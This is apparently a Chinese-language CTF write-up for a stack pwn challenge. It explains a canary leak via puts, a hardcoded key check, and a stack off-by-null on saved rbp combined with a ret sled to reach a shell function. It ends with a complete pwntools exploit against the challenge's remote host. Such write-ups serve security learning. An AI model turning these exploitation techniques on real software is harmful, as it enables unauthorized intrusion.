exp 打不通多试试几次

这题感觉是又新又好，有栈上的off_by_null又有点nop_sled的味道  
开头的puts应该是专门给你泄露canary的  
通过覆盖canary的\x00让puts误认为canary也是字符串的一部分

```
payload = b'a' * 0x20 + b'b'*0x8
sl(payload)
ru("bbbbbbbb\x0a")
canary = u64(p.recv(7).rjust(8,b'\x00'))
success("canary-->" + hex(canary))
```

进入vuln还需要通过v5的检测，这个v5是一个伪随机数，在gdb里面看一看就知道了。直接输入就可以。注意用p32，因为int四字节

```
sea("key\n\n",p32(0x02c3))
```


这个vuln就很有意思了，感觉挺花的玩的  
![NSSIMAGE](https://www.nssctf.cn/files/2023/4/23/75e171203e.jpg)  
众所周知，read的返回值是你正确输入的字节数，也就是说，整个函数会使得你输入的payload的下一个字节的最后一位改成’\x00’,也就是俗称的off_by_null（说实话第一次看见栈题目中出现off_by_null的）  
这有什么用呢？在stack题目中，我们一般需要关注的是什么，一个是rbp,一个是ret_addr。因为他俩是可以用来劫持程序流的。  
题目给与的空间最多只能修改rbp的最后一位，这就足够了。  
rbp存储的是什么？是当前函数父栈帧的栈底指针位置，而rbp往后一个字节正好就是ret_addr。  
那么思路就很明显了，通过大量输入ret.让rbp正好修改到ret上面(这个看运气，因为栈地址随机化问题，五次差不多能有一次可以中)，这样等到父栈帧返回时就，可以一直ret,直到获得shell。  
这是一个成功的例子  
![NSSIMAGE](https://www.nssctf.cn/files/2023/4/23/00d165efe6.jpg)：  
刚刚进入vuln的stack，等待输入的情况：此时rbp 位置存储的是0x…ac70,而我们是向0x…acd0(rbp-0x50)位置写入payload,也就是说0x…acd0到0x…ac08都会充满ret  
而由于off_by_null漏洞，会使得父栈帧的rbp变成0x…ac00,它下一字长就是我们填入的ret,就可以成功获得shell了  
完整Exp:

```
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
native = 0

if native:
    p = process('pwn1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('node4.anna.nssctf.cn',28116)


# libc = ELF('')

def debug():
    gdb.attach(p)
    pause()


def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))


se = lambda data: p.send(data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
sea = lambda delim, data: p.sendafter(delim, data)
rc = lambda numb=4096: p.recv(numb)
rl = lambda: p.recvline()
ru = lambda delims: p.recvuntil(delims)

shell = 0x4007C7
ret = 0x400902
payload = b'a' * 0x20 + b'b'*0x8
sl(payload)
ru("bbbbbbbb\x0a")
canary = u64(p.recv(7).rjust(8,b'\x00'))
success("canary-->" + hex(canary))
sea("key\n\n",p32(0x02c3))

payload = p64(ret) * 10
payload += flat([shell,canary])
sea("to me\n",payload)

p.interactive()
```
